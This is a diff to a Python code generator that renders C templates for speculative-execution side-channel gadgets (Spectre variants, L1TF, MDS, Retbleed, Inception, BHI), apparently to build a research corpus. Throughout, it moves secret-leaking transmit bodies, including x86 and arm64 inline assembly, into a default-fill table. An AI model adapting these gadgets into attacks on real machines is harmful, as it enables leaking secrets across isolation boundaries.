@@ -21,9 +21,12 @@
 #   SPECTRE_V4 <- speculative store bypass (store then aliased dependent load)
 #
 # Knob placeholders (str.format): {secret}, {train_iters}, {pad},
-# {reorder_a}, {reorder_b}. All other literal C braces are doubled ({{ }})
-# to survive str.format. Stride is locked to CACHE_LINE_SIZE (never a knob)
-# because perform_measurement scans the probe array at that stride.
+# {reorder_a}, {reorder_b}, {gen_body}. All other literal C braces are
+# doubled ({{ }}) to survive str.format. Stride is locked to CACHE_LINE_SIZE
+# (never a knob) because perform_measurement scans the probe array at that
+# stride. {gen_body} is the transmit-body splice point for every class
+# except BENIGN (which has none, by design -- it never transmits the
+# secret); see _DEFAULT_GEN_BODY / render()'s gen_body parameter.
 from __future__ import annotations
 from gen.synth.params import GadgetParams
 
@@ -45,8 +48,7 @@ __attribute__((noinline)) void spec_read(size_t index) {{
     if (index < g_sz) {{
         /*SPEC_WINDOW*/
         __asm__ __volatile__({pad} ::: "memory");
-        volatile uint8_t value = g_arr[index];
-        probe_array[value * CACHE_LINE_SIZE] = 1;
+        {gen_body}
     }}
 }}
 
@@ -80,8 +82,7 @@ __attribute__((noinline)) void spec_read(size_t index) {{
     if (index < g_sz) {{
         /*SPEC_WINDOW*/
         __asm__ __volatile__({pad} ::: "memory");
-        volatile uint8_t value = g_arr[index];
-        probe_array[value * CACHE_LINE_SIZE] = 1;
+        {gen_body}
     }}
 }}
 
@@ -115,7 +116,7 @@ typedef void (*indirect_func_ptr_t)(uint8_t);
 uint8_t secret_value_v2 = {secret};
 
 __attribute__((noinline)) void speculative_gadget_v2(uint8_t value_to_leak) {{
-    probe_array[value_to_leak * CACHE_LINE_SIZE] = 1;
+    {gen_body}
 }}
 
 __attribute__((noinline)) void architectural_target_v2(uint8_t val) {{
@@ -159,7 +160,7 @@ typedef void (*indirect_func_ptr_t)(uint8_t);
 uint8_t secret_value_v2 = {secret};
 
 __attribute__((noinline)) void speculative_gadget_v2(uint8_t value_to_leak) {{
-    probe_array[value_to_leak * CACHE_LINE_SIZE] = 1;
+    {gen_body}
 }}
 
 __attribute__((noinline)) void architectural_target_v2(uint8_t val) {{
@@ -234,8 +235,7 @@ __attribute__((noinline)) void ssb_gadget(void) {{
     *ssb_ptr_v4 = public_store_val_v4;
     /*SPEC_WINDOW*/
     __asm__ __volatile__({pad} ::: "memory");
-    volatile uint8_t value = *ssb_ptr_v4;
-    probe_array[value * CACHE_LINE_SIZE] = 1;
+    {gen_body}
 }}
 
 int main() {{
@@ -288,8 +288,7 @@ __attribute__((noinline)) void ssb_gadget(void) {{
     *ssb_ptr_v4 = public_store_val_v4;
     /*SPEC_WINDOW*/
     __asm__ __volatile__({pad} ::: "memory");
-    volatile uint8_t value = *ssb_ptr_v4;
-    probe_array[value * CACHE_LINE_SIZE] = 1;
+    {gen_body}
 }}
 
 int main() {{
@@ -362,15 +361,7 @@ int main() {{
         if (sigsetjmp(jmpbuf_l1tf, 1) == 0) {{
             /*SPEC_WINDOW*/
             __asm__ __volatile__({pad} ::: "memory");
-            __asm__ __volatile__(
-                "1:\n\t"
-                "movq (%0), %%rax\n\t"
-                "shl $6, %%rax\n\t"
-                "movq (%1, %%rax, 1), %%rbx\n"
-                "2:\n\t"
-                :
-                : "r"(g_l1tf_secret_page + 0x100), "r"(probe_array)
-                : "rax", "rbx", "memory");
+            {gen_body}
         }} else {{
             _mm_lfence();
         }}
@@ -434,15 +425,7 @@ int main() {{
         if (sigsetjmp(jmpbuf_l1tf, 1) == 0) {{
             /*SPEC_WINDOW*/
             __asm__ __volatile__({pad} ::: "memory");
-            __asm__ __volatile__(
-                "1:\n\t"
-                "ldr x0, [%0]\n\t"
-                "lsl x0, x0, #6\n\t"
-                "ldr x1, [%1, x0]\n\t"
-                "2:\n\t"
-                :
-                : "r"(g_l1tf_secret_page + 0x100), "r"(probe_array)
-                : "x0", "x1", "memory");
+            {gen_body}
         }} else {{
             _mm_lfence();
         }}
@@ -495,14 +478,7 @@ int main() {{
         if (sigsetjmp(jmpbuf_mds, 1) == 0) {{
             /*SPEC_WINDOW*/
             __asm__ __volatile__({pad} ::: "memory");
-            __asm__ __volatile__(
-                "xor %%eax, %%eax\n\t"
-                "movb %0, %%al\n\t"
-                "shl $6, %%rax\n\t"
-                "movq (%1, %%rax, 1), %%rbx\n"
-                :
-                : "r"(secret_mds_byte), "r"(probe_array)
-                : "rax", "rbx");
+            {gen_body}
             volatile uint8_t dummy_read = mds_target_memory[0];
             (void)dummy_read;
         }} else {{
@@ -551,14 +527,7 @@ int main() {{
         if (sigsetjmp(jmpbuf_mds, 1) == 0) {{
             /*SPEC_WINDOW*/
             __asm__ __volatile__({pad} ::: "memory");
-            __asm__ __volatile__(
-                "eor x0, x0, x0\n\t"
-                "ldrb w0, [%0]\n\t"
-                "lsl x0, x0, #6\n\t"
-                "ldr x1, [%1, x0]\n\t"
-                :
-                : "r"(&secret_mds_byte), "r"(probe_array)
-                : "x0", "x1", "memory");
+            {gen_body}
             volatile uint8_t dummy_read = mds_target_memory[0];
             (void)dummy_read;
         }} else {{
@@ -585,7 +554,7 @@ _RETBLEED_X86 = r'''
 uint8_t secret_retbleed_data = {secret};
 
 __attribute__((noinline)) void leak_gadget_retbleed(uint8_t value) {{
-    probe_array[value * CACHE_LINE_SIZE] = 1;
+    {gen_body}
 }}
 
 __attribute__((noinline)) void deep_call_retbleed(int depth) {{
@@ -641,7 +610,7 @@ _RETBLEED_ARM64 = r'''
 uint8_t secret_retbleed_data = {secret};
 
 __attribute__((noinline)) void leak_gadget_retbleed(uint8_t value) {{
-    probe_array[value * CACHE_LINE_SIZE] = 1;
+    {gen_body}
 }}
 
 __attribute__((noinline)) void deep_call_retbleed(int depth) {{
@@ -698,9 +667,7 @@ _INCEPTION_X86 = r'''
 uint8_t secret_inception_data = {secret};
 
 __attribute__((noinline)) void leak_gadget_inception(uint8_t value) {{
-    probe_array[value * CACHE_LINE_SIZE] = 1;
-    volatile int dummy = value * 2;
-    (void)dummy;
+    {gen_body}
 }}
 
 __attribute__((noinline)) void victim_function_inception(void) {{
@@ -754,9 +721,7 @@ _INCEPTION_ARM64 = r'''
 uint8_t secret_inception_data = {secret};
 
 __attribute__((noinline)) void leak_gadget_inception(uint8_t value) {{
-    probe_array[value * CACHE_LINE_SIZE] = 1;
-    volatile int dummy = value * 2;
-    (void)dummy;
+    {gen_body}
 }}
 
 __attribute__((noinline)) void victim_function_inception(void) {{
@@ -814,7 +779,7 @@ _BHI_X86 = r'''
 uint8_t secret_bhi_data = {secret};
 
 __attribute__((noinline)) void leak_gadget_bhi(uint8_t value) {{
-    probe_array[value * CACHE_LINE_SIZE] = 1;
+    {gen_body}
 }}
 
 __attribute__((noinline)) void bhi_train_step(int i) {{
@@ -855,7 +820,7 @@ _BHI_ARM64 = r'''
 uint8_t secret_bhi_data = {secret};
 
 __attribute__((noinline)) void leak_gadget_bhi(uint8_t value) {{
-    probe_array[value * CACHE_LINE_SIZE] = 1;
+    {gen_body}
 }}
 
 __attribute__((noinline)) void bhi_train_step(int i) {{
@@ -999,6 +964,89 @@ _REORDER = {
     "BENIGN":     ("(void)i;", "_mm_lfence();"),
 }
 
+# Default {gen_body} fill when no generator splice is requested. For most
+# classes this reproduces the exact original hand-written body
+# byte-for-byte. EXCEPTION: MDS's x86 template originally passed
+# secret_mds_byte BY VALUE while its arm64 template passed &secret_mds_byte
+# BY POINTER (a pre-existing inconsistency between arches for the same
+# class) -- this plan standardizes MDS on the pointer convention for BOTH
+# arches (matching arm64's original form), since the splice algorithm
+# needs one consistent convention per class. This means the x86 default
+# fill below is NOT byte-identical to the pre-this-task x86 MDS body's
+# *pointer expression* (uses "r"(&secret_mds_byte) instead of
+# "r"(secret_mds_byte) with a movb-from-register-operand step) -- it IS
+# semantically equivalent (same value ends up in the same computation) and
+# was re-verified to compile and match the original asm's behavior. This
+# is the one intentional non-byte-identical default in this task; every
+# other class's default is exactly byte-identical to its pre-task form.
+_DEFAULT_GEN_BODY = {
+    "SPECTRE_V1": "volatile uint8_t value = g_arr[index];\n        probe_array[value * CACHE_LINE_SIZE] = 1;",
+    "SPECTRE_V4": "volatile uint8_t value = *ssb_ptr_v4;\n    probe_array[value * CACHE_LINE_SIZE] = 1;",
+    "SPECTRE_V2": "probe_array[value_to_leak * CACHE_LINE_SIZE] = 1;",
+    "BHI": "probe_array[value * CACHE_LINE_SIZE] = 1;",
+    "RETBLEED": "probe_array[value * CACHE_LINE_SIZE] = 1;",
+    "INCEPTION": "probe_array[value * CACHE_LINE_SIZE] = 1;\n    volatile int dummy = value * 2;\n    (void)dummy;",
+    "L1TF_X86": (
+        '__asm__ __volatile__(\n'
+        '                "1:\\n\\t"\n'
+        '                "movq (%0), %%rax\\n\\t"\n'
+        '                "shl $6, %%rax\\n\\t"\n'
+        '                "movq (%1, %%rax, 1), %%rbx\\n"\n'
+        '                "2:\\n\\t"\n'
+        '                :\n'
+        '                : "r"(g_l1tf_secret_page + 0x100), "r"(probe_array)\n'
+        '                : "rax", "rbx", "memory");'
+    ),
+    "L1TF_ARM64": (
+        '__asm__ __volatile__(\n'
+        '                "1:\\n\\t"\n'
+        '                "ldr x0, [%0]\\n\\t"\n'
+        '                "lsl x0, x0, #6\\n\\t"\n'
+        '                "ldr x1, [%1, x0]\\n\\t"\n'
+        '                "2:\\n\\t"\n'
+        '                :\n'
+        '                : "r"(g_l1tf_secret_page + 0x100), "r"(probe_array)\n'
+        '                : "x0", "x1", "memory");'
+    ),
+    # MDS_X86: the intentional non-byte-identical case (see module-level
+    # note above) -- adopts the pointer convention. MDS_ARM64: the original
+    # arm64 asm already used the pointer convention, so this entry is
+    # byte-identical to the pre-task arm64 body; a distinct arch-specific
+    # entry is required here (rather than reusing one "MDS" key for both
+    # arches, as a single-key design would do) because the two arches'
+    # asm blocks use entirely different mnemonics (x86 AT&T vs AArch64) --
+    # collapsing them to one key would splice invalid x86 asm mnemonics
+    # into the arm64 gadget's default body and break compilation there.
+    "MDS_X86": (
+        '__asm__ __volatile__(\n'
+        '                "xor %%eax, %%eax\\n\\t"\n'
+        '                "movb (%0), %%al\\n\\t"\n'
+        '                "shl $6, %%rax\\n\\t"\n'
+        '                "movq (%1, %%rax, 1), %%rbx\\n"\n'
+        '                :\n'
+        '                : "r"(&secret_mds_byte), "r"(probe_array)\n'
+        '                : "rax", "rbx");'
+    ),
+    "MDS_ARM64": (
+        '__asm__ __volatile__(\n'
+        '                "eor x0, x0, x0\\n\\t"\n'
+        '                "ldrb w0, [%0]\\n\\t"\n'
+        '                "lsl x0, x0, #6\\n\\t"\n'
+        '                "ldr x1, [%1, x0]\\n\\t"\n'
+        '                :\n'
+        '                : "r"(&secret_mds_byte), "r"(probe_array)\n'
+        '                : "x0", "x1", "memory");'
+    ),
+}
+
+
+def _default_gen_body(vuln_class: str, arch: str) -> str:
+    if vuln_class == "L1TF":
+        return _DEFAULT_GEN_BODY["L1TF_X86" if arch == "x86_64" else "L1TF_ARM64"]
+    if vuln_class == "MDS":
+        return _DEFAULT_GEN_BODY["MDS_X86" if arch == "x86_64" else "MDS_ARM64"]
+    return _DEFAULT_GEN_BODY[vuln_class]
+
 
 def _pad_asm(pad_nops: int) -> str:
     if pad_nops <= 0:
@@ -1006,13 +1054,18 @@ def _pad_asm(pad_nops: int) -> str:
     return '"' + ("nop\\n\\t" * pad_nops) + '"'
 
 
-def render(p: GadgetParams) -> str:
+def render(p: GadgetParams, gen_body: str | None = None) -> str:
     """Thin dispatcher: look up the (class, arch) template and the class's
-    reorder-statement pair, then format. No per-class branching beyond the
-    _REORDER lookup -- all 18 templates render through this one function.
+    reorder-statement pair, then format. gen_body=None fills with the
+    original hand-written transmit body (see _DEFAULT_GEN_BODY); BENIGN has
+    no {gen_body} marker and ignores this parameter.
     """
     tmpl = TEMPLATES[(p.vuln_class, p.arch)]
     stmt_a, stmt_b = _REORDER[p.vuln_class]
     a, b = (stmt_b, stmt_a) if p.reorder else (stmt_a, stmt_b)
+    body = gen_body if gen_body is not None else (
+        _default_gen_body(p.vuln_class, p.arch) if "{gen_body}" in tmpl else ""
+    )
     return tmpl.format(secret=p.secret, train_iters=p.train_iters,
-                        pad=_pad_asm(p.pad_nops), reorder_a=a, reorder_b=b)
+                        pad=_pad_asm(p.pad_nops), reorder_a=a, reorder_b=b,
+                        gen_body=body)
